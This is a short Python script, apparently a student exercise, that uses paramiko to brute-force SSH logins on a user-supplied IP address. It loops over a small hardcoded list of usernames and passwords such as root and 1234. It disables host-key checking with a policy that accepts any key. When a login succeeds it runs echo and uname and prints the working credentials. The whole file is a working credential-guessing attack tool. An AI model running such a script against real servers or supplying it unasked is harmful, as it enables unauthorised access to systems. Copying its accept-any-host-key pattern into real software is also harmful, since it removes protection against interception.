import argparse, paramiko

class AllowAnythingPolicy(paramiko.MissingHostKeyPolicy):
    def missing_host_key(self, client, hostname, key):
        return

def main(hostname, username, password):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(AllowAnythingPolicy())
    client.connect(hostname=hostname, username=username, password=password)
    
    for command in 'echo "Script criado por Eric Reis 99515 | FHO - Sistemas de informacao"','uname':
        stdin, stdout, stderr = client.exec_command(command)
        stdin.close()
        print(repr(stdout.read()))
        stdout.close()
        stderr.close()

    client.close()

def bruteForce(InfoHostname):

    listalogin=['root', 'toor', 'teste']
    listasenha=['1234', '12345', 'root']
    listatotal = len(listalogin)
    listaStotal = len(listasenha)

    for login in range(listatotal):
        for senha in range(listaStotal):
            try:
                main(hostname=InfoHostname, username=listalogin[login], password=listasenha[senha])
                print(f'Sucesso, usuario: {listalogin[login]} e Senha: {listasenha[senha]} correto!!')
            except paramiko.ssh_exception.AuthenticationException:
                print(f'Erro, usuario: {listalogin[login]} e Senha: {listasenha[senha]} incorreta!!')
                pass


if __name__ == '__main__':
    InfoHostname = input('Insira o IP alvo :')
    print('Iniciando o Brute Force....')
    bruteForce(InfoHostname)
    print('Brute Force finalizado....')
